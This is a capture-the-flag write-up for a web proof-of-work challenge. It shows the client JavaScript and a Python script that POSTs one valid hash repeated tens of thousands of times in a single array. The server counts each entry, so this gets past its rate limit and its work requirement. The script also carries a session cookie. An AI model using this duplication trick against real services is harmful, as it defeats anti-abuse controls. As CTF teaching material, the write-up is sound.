# Introduction
This challange is about reading a little JS understand logic and send modified requests.

## Challange Discription

compute hash to get your flag

https://web-pow-lz56g6.wanictf.org/



## Step 1

Here is complete JS code :

```JavaScript


<!DOCTYPE html>
<html>
  <head>
    <title>POW Client</title>
  </head>
  <body>
    <h1>Proof of Work</h1>
    <p>Calculate hashes to get the flag!</p>
    <p>Client status: <span id="client-status">(no status yet)</span></p>
    <p>Server response: <span id="server-response">(no hash sent yet)</span></p>
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"
      integrity="sha512-a+SUDuwNzXDvz4XrIcXHuCf089/iJAoN4lmrXJg18XnduKK6YlDHNRalv4yd1N40OKI80tFidF+rqTFKGPoWFQ=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    ></script>
    <script>
       function hash(input) {
        let result = input;
        for (let i = 0; i < 10; i++) {
          result = CryptoJS.SHA256(result);
        }
        return (result.words[0] & 0xFFFFFF00) === 0;
      }
      async function send(array) {
        document.getElementById("server-response").innerText = await fetch(
          "/api/pow",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(array),
          }
        ).then((r) => r.text());
      }
      let i = BigInt(localStorage.getItem("pow_progress") || "0");
      async function main() {
        await send([]);
        async function loop() {
          document.getElementById(
            "client-status"
          ).innerText = `Checking ${i.toString()}...`;
          localStorage.setItem("pow_progress", i.toString());
          for (let j = 0; j < 1000; j++) {
            i++;
            if (hash(i.toString())) {
              await send([i.toString()]);
            }
          }
          requestAnimationFrame(loop);
        }
        loop();
      }
      main();
    </script>
  </body>
</html>

```

There is a **POST** request to the server that if the json data inside is not valid it will response with `400 bad Request` :

![](../assets/Pow_1.png)


We have to ways here to to calculate a value that when goes to **hash()** function returns true value or wait for client to calculate and find value for us and when it sends a POST request we capture it :

![](../assets/Pow_2.png)


Since there is a rate limit in sending request when i tried multiple values of same in a list is saw server will count base on the numbers of list elements, so here is a python script to send multiple requests same time :

```Python
import requests
import json

# Define the URL
url = 'https://web-pow-lz56g6.wanictf.org/api/pow'
pows = []
for i in range(1,50000):
    pows.append("45707619")
# Define the headers
headers = {
    'Host': 'web-pow-lz56g6.wanictf.org',
    'Cookie': 'pow_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiI0MDkwNWU1Ni0xYjZmLTQzZjEtODZiZS1lZjcxZmU3NWE0YzkifQ.l6bqjpdljUJ-tdyGNQcbPLSPKr6cB0FhjwQuiWU_bgk; googtrans=/auto/en',
    'Sec-Ch-Ua': '"Chromium";v="125", "Not.A/Brand";v="24"',
    'Sec-Ch-Ua-Platform': '"Android"',
    'Sec-Ch-Ua-Mobile': '?1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Mobile Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Origin': 'https://web-pow-lz56g6.wanictf.org',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://web-pow-lz56g6.wanictf.org/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Priority': 'u=1, i'
}

# Define the JSON payload
data = json.dumps(pows)

# Send the POST request
response = requests.post(url, headers=headers, data=data, verify=False)

# Print the response
print(response.status_code)
print(response.text)

```